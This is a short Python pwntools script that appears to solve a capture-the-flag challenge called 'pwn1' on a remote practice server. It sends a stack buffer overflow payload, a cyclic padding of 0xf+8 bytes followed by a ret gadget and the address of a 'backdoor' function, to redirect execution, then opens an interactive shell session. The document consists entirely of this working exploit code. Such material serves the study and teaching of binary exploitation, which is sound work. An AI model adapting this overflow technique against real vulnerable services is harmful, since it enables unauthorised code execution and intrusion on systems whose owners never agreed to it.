from pwn import *

backdoor = 0x401186
retn = 0x401198

# io = process('./pwn1')
io = remote('node3.buuoj.cn', 29999)
sleep(1)
# io.recv()
io.sendline(cyclic(0xf+8) + p64(retn) + p64(backdoor))
io.interactive()
